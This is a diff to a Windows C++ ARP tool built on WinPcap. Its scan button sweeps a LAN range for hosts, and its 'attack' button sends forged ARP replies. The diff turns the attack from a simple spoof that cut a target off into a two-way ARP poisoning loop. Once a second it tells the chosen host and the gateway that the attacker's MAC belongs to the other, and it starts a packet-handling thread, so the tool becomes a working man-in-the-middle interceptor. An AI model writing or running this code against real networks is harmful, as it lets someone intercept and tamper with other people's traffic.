@@ -22,7 +22,7 @@ void CARPTestDlg::DoDataExchange(CDataExchange* pDX)
 	DDX_Control(pDX, IDC_BUTTON1, m_attackButton);
 	DDX_Control(pDX, IDC_EDIT4, m_selfIpEdit);
 	DDX_Control(pDX, IDC_EDIT5, m_selfMacEdit);
-	DDX_Control(pDX, IDC_EDIT8, m_selfGetwayEdit);
+	DDX_Control(pDX, IDC_EDIT8, m_selfGatewayEdit);
 	DDX_Control(pDX, IDC_LIST2, m_hostList);
 	DDX_Control(pDX, IDC_EDIT6, m_startIpEdit);
 	DDX_Control(pDX, IDC_EDIT7, m_stopIpEdit);
@@ -135,7 +135,7 @@ void CARPTestDlg::OnLbnSelchangeList1()
 		g_adapter = g_adapter->next;
 
 	// get adapter infomation
-	CString ip, getway;
+	CString ip, gateway;
 	BYTE mac[6];
 
 	IP_ADAPTER_INFO adapterInfo[16];
@@ -152,7 +152,7 @@ void CARPTestDlg::OnLbnSelchangeList1()
 		{
 			ip = pInfo->IpAddressList.IpAddress.String;
 			MoveMemory(mac, pInfo->Address, 6);
-			getway = pInfo->GatewayList.IpAddress.String;
+			gateway = pInfo->GatewayList.IpAddress.String;
 			break;
 		}
 	if (ip == "")
@@ -170,8 +170,8 @@ void CARPTestDlg::OnLbnSelchangeList1()
 	sMac.Format("%02X-%02X-%02X-%02X-%02X-%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
 	m_selfMacEdit.SetWindowText(sMac);
 	MoveMemory(g_selfMac, mac, 6);
-	m_selfGetwayEdit.SetWindowText(getway);
-	inputIp(getway, g_selfGetway);
+	m_selfGatewayEdit.SetWindowText(gateway);
+	inputIp(gateway, g_selfGateway);
 
 	BYTE* bIp = (BYTE*)&iIp;
 	bIp[3] = 1;
@@ -186,6 +186,8 @@ void CARPTestDlg::OnLbnSelchangeList1()
 void CARPTestDlg::OnBnClickedButton2()
 {
 	m_scanButton.EnableWindow(FALSE);
+	m_hostList.ResetContent();
+	g_host.clear();
 	AfxBeginThread([](LPVOID _thiz)->UINT{
 		CARPTestDlg* thiz = (CARPTestDlg*)_thiz;
 
@@ -204,14 +206,14 @@ void CARPTestDlg::OnBnClickedButton2()
 			thiz->MessageBox("Please input start IP.");
 			return 0;
 		}
-		startIp = reverseInt(startIp);
+		startIp = htonl(startIp);
 		thiz->m_stopIpEdit.GetWindowText(sIp);
 		if (!inputIp(sIp, stopIp))
 		{
 			thiz->MessageBox("Please input stop IP.");
 			return 0;
 		}
-		stopIp = reverseInt(stopIp);
+		stopIp = htonl(stopIp);
 		if (startIp > stopIp)
 		{
 			int t = startIp;
@@ -225,35 +227,36 @@ void CARPTestDlg::OnBnClickedButton2()
 			return 0;
 		for (int ip = startIp; ip <= stopIp; ip++)
 		{
-			int rIp = reverseInt(ip);
-			if (rIp != g_selfIp && rIp != g_selfGetway)
+			int rIp = htonl(ip);
+			if (rIp != g_selfIp)
 			{
 				packet.targetIp = rIp;
 				pcap_sendpacket(adapter, (u_char*)&packet, sizeof(packet));
+				Sleep(10);
 			}
 		}
 
 		// get reply
-		thiz->m_hostList.ResetContent();
-		g_host.clear();
 		DWORD time = GetTickCount();
 		pcap_pkthdr* header;
 		const BYTE* pkt_data;
 		int res;
-		while ((res = pcap_next_ex(adapter, &header, &pkt_data)) >= 0 && GetTickCount() - time < 5 * 1000)
+		while ((res = pcap_next_ex(adapter, &header, &pkt_data)) >= 0 && GetTickCount() - time < 3 * 1000)
 		{
 			if (res == 0 || header->len < sizeof(ARPPacket)) // timeout or not ARP
 				continue;
 			const ARPPacket* pak = (const ARPPacket*)pkt_data;
 			// not target ARP reply
-			if (pak->type != 0x0608 || pak->opcode != 0x0200 || pak->senderIp == g_selfGetway || pak->senderIp == g_selfIp)
+			if (pak->type != 0x0608 || pak->opcode != 0x0200)
 				continue;
 
 			BYTE* bIp = (BYTE*)&pak->senderIp;
 			sIp.Format("%d.%d.%d.%d", bIp[0], bIp[1], bIp[2], bIp[3]);
-			thiz->m_hostList.SetItemDataPtr(thiz->m_hostList.AddString(sIp), (void*)pak->senderIp);
+			if (pak->senderIp != g_selfGateway)
+				thiz->m_hostList.SetItemDataPtr(thiz->m_hostList.AddString(sIp), (void*)pak->senderIp);
 			MoveMemory(g_host[pak->senderIp], pak->senderMac, 6);
 		}
+		MoveMemory(g_gatewayMac, g_host[g_selfGateway], 6);
 
 		pcap_close(adapter);
 		thiz->m_scanButton.EnableWindow(TRUE);
@@ -273,37 +276,53 @@ void CARPTestDlg::OnBnClickedButton1()
 
 	AfxBeginThread([](LPVOID _thiz)->UINT{
 		CARPTestDlg* thiz = (CARPTestDlg*)_thiz;
-
-		ARPPacket packet(0x0200);
-		// target IP
 		int index = thiz->m_hostList.GetCurSel();
 		if (index == LB_ERR)
 		{
 			thiz->MessageBox("Please select target IP!");
 			return 0;
 		}
-		packet.targetIp = (int)thiz->m_hostList.GetItemDataPtr(index);
-		// destination MAC
-		MoveMemory(packet.destinationMac, g_host[packet.targetIp], 6);
+
+		int targetIp = (int)thiz->m_hostList.GetItemDataPtr(index);
+		ARPPacket packet(0x0200);
 		// source MAC
-		ZeroMemory(packet.sourceMac, 6); // a wrong MAC
+		MoveMemory(packet.sourceMac, g_selfMac, 6);
 		// sender MAC
 		MoveMemory(packet.senderMac, packet.sourceMac, 6);
-		// sender IP
-		packet.senderIp = g_selfGetway;
-		// target MAC
-		MoveMemory(packet.targetMac, packet.destinationMac, 6);
 
-		// send
 		pcap_t* adapter;
 		if (!GetAdapterHandle(adapter))
 			return 0;
+		AfxBeginThread(PacketHandleThread, adapter);
+		thiz->m_hostList.EnableWindow(FALSE);
 		thiz->m_attackButton.SetWindowText("stop");
 		attack = TRUE;
+		// send
 		while (attack)
 		{
+			// send to target
+			// target IP
+			packet.targetIp = targetIp;
+			// destination MAC
+			MoveMemory(packet.destinationMac, g_host[packet.targetIp], 6);
+			// target MAC
+			MoveMemory(packet.targetMac, packet.destinationMac, 6);
+			// sender IP
+			packet.senderIp = g_selfGateway;
 			pcap_sendpacket(adapter, (u_char*)&packet, sizeof(packet));
-			for (int i = 0; i < 20; i++) // 2s
+
+			// send to gateway
+			// target IP
+			packet.targetIp = g_selfGateway;
+			// destination MAC
+			MoveMemory(packet.destinationMac, g_host[packet.targetIp], 6);
+			// target MAC
+			MoveMemory(packet.targetMac, packet.destinationMac, 6);
+			// sender IP
+			packet.senderIp = targetIp;
+			pcap_sendpacket(adapter, (u_char*)&packet, sizeof(packet));
+
+			for (int i = 0; i < 10; i++) // 1s
 			{
 				if (!attack)
 					break;
@@ -311,6 +330,7 @@ void CARPTestDlg::OnBnClickedButton1()
 			}
 		}
 		thiz->m_attackButton.SetWindowText("start");
+		thiz->m_hostList.EnableWindow(TRUE);
 		pcap_close(adapter);
 		return 0;
 	}, this);
